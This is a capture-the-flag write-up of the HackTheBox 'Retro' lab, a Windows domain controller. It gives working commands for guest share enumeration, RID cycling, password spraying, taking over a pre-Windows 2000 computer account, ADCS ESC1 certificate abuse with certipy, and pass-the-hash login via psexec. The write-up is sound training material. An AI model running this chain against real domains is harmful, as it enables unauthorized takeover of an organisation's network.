# [HackTheBox - Retro](https://app.hackthebox.com/machines/Retro)
![8c137bf429e00361974c2bae911f72fb.png](/resources/8c137bf429e00361974c2bae911f72fb.png)
## Table of Contents

- [Abstract](#abstract)
- [Enumeration](#enumeration)
- [Obtaining trainee password](#obtaining-trainee-password)
- [Discovery of Pre-Windows 2000 computer account](#discovery-of-pre-windows-2000-computer-account)
- [Discovery of ADCS ESC1](#discovery-of-adcs-esc1)
- [Privilege Escalation with ADCS ESC1](#privilege-escalation-with-adcs-esc1)

***
## Abstract
Retro is a vulnlab machine imported to HackTheBox as a easy Windows Active Directory box, I started with network enumeration with nmap, revealing this machine is a domain controller and no extra service running on this machine and no WinRM enabled as well.

On the enumeration phase, I found that guest account is enabled and can be used to access "Trainees" share and in the share reveals that there is one trainee account with weak password on this domain. after retrieving user list with RID-Cycling method, I found that "trainee" account is using its username as password and can be use to access "Notes" shares.

On "Notes" shares has user flag and also a text file implying the existence of Pre2K computer account which I changed its password and discover that domain computers group can enroll a certificate from "RetroClients" certificate template which have ADCS ESC1 misconfiguration.

Leveraging ADCS ESC1,I obtained NTLM of Administrator account and finally root the box with psexec.

## Enumeration
I start with nmap scan without any flag to quickly scan for well-known port which reveals that this machine is a domain controller and does not have any services beside required services for active directory running on this machine and one more thing to notice here is no port 5985 which mean we can not use WinRM to get access to this machine.
![a69c5ccd908178c5dbea1aab27096649.png](/resources/a69c5ccd908178c5dbea1aab27096649.png)

I rerun my scan again with `-sCV` just to find the hostname which I'll add to my `/etc/hosts` file so I won't need to specify IP address if I did not need to.
![21c26216b7e1d024875bce751036852e.png](/resources/21c26216b7e1d024875bce751036852e.png)

Since there is no other service that I could dig it, I start with null session enumeration on SMB and LDAP protocol which I can see that null session could not be used to pull user list or access file share.

![a001c8716d201b1e4ad7cddf382cca62.png](/resources/a001c8716d201b1e4ad7cddf382cca62.png)

But the guest account is enabled and I can use it to list a share which reveals non-standard share with READ access as guest user.
```
uv run nxc smb retro.vl -u 'guest' -p '' --shares
```
![4e6746f403acb466703db95bb9153e61.png](/resources/4e6746f403acb466703db95bb9153e61.png)

Upon connection to this share and list its content, I found `Important.txt` which was left here for "trainees" of the company to read.
```
smbclient \\\\retro.vl\\Trainees -N
```
![dfbe81308130aba74d008b9e4e621ec0.png](/resources/dfbe81308130aba74d008b9e4e621ec0.png)

The content of this file explicitly says that there is one trainee account and since some of trainees struggling with remembering strong and unique passwords then the new password must be easy to guess or you guess it. it would be "user:user" for sure.

![df7f133ddb7fb60291a529259b8b2270.png](/resources/df7f133ddb7fb60291a529259b8b2270.png)

Since guest account is enabled and can connect to shares then I use RID cycling method with NetExec to create user list and I can use this list to conduct password spraying attack when I obtained user password later. and one more thing to notice is the "trainee" so this is the user I want to try to connect to with "user:user" combination.
```
uv run nxc smb retro.vl -u 'guest' -p '' --rid-brute | grep SidTypeUser | cut -d'\' -f2 | cut -d' ' -f1 | tee users
```
![ad027525635d76d1902325182fbe0678.png](/resources/ad027525635d76d1902325182fbe0678.png)

## Obtaining trainee password
Using NetExec to test "user:user" combination and I got 1 hit as "trainee" user as expected.
```
uv run nxc smb retro.vl -u users -p users --no-bruteforce --continue-on-success
```
![2903cf9e4fa44af4412d84688466a4cd.png](/resources/2903cf9e4fa44af4412d84688466a4cd.png)

Using this credential to enumerate for more shares which I found another share that can be accessed with this user.
```
uv run nxc smb retro.vl -u trainee -p trainee --shares
```
![86ff4c5df88e70aa1a82d6acfb9581d4.png](/resources/86ff4c5df88e70aa1a82d6acfb9581d4.png)

## Discovery of Pre-Windows 2000 computer account
Upon opening this new share and list its content. I discover user flag and `ToDo.txt` file.
```
smbclient \\\\retro.vl\\Notes -U trainee%trainee
```
![9c4eb9ecc2286ecc29eadac9468e2a39.png](/resources/9c4eb9ecc2286ecc29eadac9468e2a39.png)

The content of `ToDo.txt`, I got a clue that there should be a pre-created computer account and that must be pre-Windows 2000 computer (Pre2k).

![bd332d6209e868026555a90b3d7f8d80.png](/resources/bd332d6209e868026555a90b3d7f8d80.png)

NetExec have a module that could be used to retrieve pre-Windows 2000 computer account which I found that "banking$" is one I am looking for.
```
uv run nxc ldap retro.vl -u trainee -p trainee -M pre2k
```
![85cc743dcfbe312568ea27de3730d83d.png](/resources/85cc743dcfbe312568ea27de3730d83d.png)

When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing $) so in this case, the password should be "banking" and it is confirmed that this password can be used but to be able to fully utilize this account, I will need to change its password first.
```
uv run nxc smb retro.vl -u 'banking$' -p banking
```
![126671f12b30bd2610bb0aabc6c2202e.png](/resources/126671f12b30bd2610bb0aabc6c2202e.png)

I will use impacket-changepasswd to change its password and now I have this account ready to be utilized.
```
impacket-changepasswd retro.vl/banking\$@retro.vl -newpass '12345' -p rpc-samr
uv run nxc smb retro.vl -u 'banking$' -p 12345
```
![9bae8142b2fc3971ff1cc7bc4280337d.png](/resources/9bae8142b2fc3971ff1cc7bc4280337d.png)

## Discovery of ADCS ESC1
I use rusthound-ce to collect domain information which can be used with bloodhound ce and visualization and find out if pre2k computer account can do anything.
```
rusthound-ce -d retro.vl -u trainee@retro.vl -p trainee -z
```
![dcd9df4ef9f9a3d958ded9d094bd1902.png](/resources/dcd9df4ef9f9a3d958ded9d094bd1902.png)

Best thing about rusthound-ce beside how fast it takes to collect domain information is how vast it collect information from the domain which includes certificate template as well and I can see that there is one non-standard certificate template that the domain computers group can enroll and it has "EnrolleeSuppliesSubject" flag set and this mean I can leverage ADCS ESC1 to get ccache and NTLM hash of any user on this domain.

![660441c1f6adc21b0e7fbf99f0fab939.png](/resources/660441c1f6adc21b0e7fbf99f0fab939.png)

I confim ESC1 again with certipy-find module in NetExec (or you can use certipy directly) which reveals that "RetroClients" template have misconfiguration as ESC1.
```
uv run nxc ldap retro.vl -u 'banking$' -p 12345 -M certipy-find
```
![6e5e9b8fc167c9518464898d43a997bd.png](/resources/6e5e9b8fc167c9518464898d43a997bd.png)

## Privilege Escalation with ADCS ESC1
To leverage ADCS ESC1, I use certipy-ad to request certificate of Administrator user first but there is a problem due to the key length.
```
uv run certipy-ad req -u 'banking$' -p '12345' -dc-ip $IP -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500'
```
![470ea8728db469e17e393b654c2735bf.png](/resources/470ea8728db469e17e393b654c2735bf.png)

I go back to certipy-find result again which I can see that I need to specify the key size to have at least 4096 in length.

![384a54e25f33c226a0e775fa2db95475.png](/resources/384a54e25f33c226a0e775fa2db95475.png)

Now after adding `-key-size 4096` to the same command, I get the certificate file of the Administrator user of this domain.
```
certipy req -u 'banking$' -p '12345' -dc-ip $IP -ca 'retro-DC-CA' -template 'RetroClients' -upn 'Administrator@retro.vl' -sid 'S-1-5-21-2983547755-698260136-4283918172-500' -key-size 4096
```
![8881f998cc7467fcb3ea6a0acaf26c5f.png](/resources/8881f998cc7467fcb3ea6a0acaf26c5f.png)

Next, I use certipy to authenticate to the domain controller again to automatically retrieve TGT of the Administrator and use that to retrive NTLM hash as well (I revert machine once so the IP changed)
```
certipy auth -pfx administrator.pfx -dc-ip $IP 
```
![691ff79764a88a890e961f0713293a74.png](/resources/691ff79764a88a890e961f0713293a74.png)

Now I can use psexec, wmiexec, smbexec to access the machine as SYSTEM.

```
impacket-psexec 'Administrator@retro.vl' -hashes :252fac7066d93dd009d4fd2cd0368389 -service-name chicken_svc -remote-binary-name powershell.exe
```
![43f8f589b010cec70d38a08d84c02e65.png](/resources/43f8f589b010cec70d38a08d84c02e65.png)

Now I will loot root flag and root the box :D

![0ddbe6ded024cab64cdd30d110f88152.png](/resources/0ddbe6ded024cab64cdd30d110f88152.png)

![31d3b66c57999b2b03986cf102553004.png](/resources/31d3b66c57999b2b03986cf102553004.png)
https://labs.hackthebox.com/achievement/machine/1438364/671
***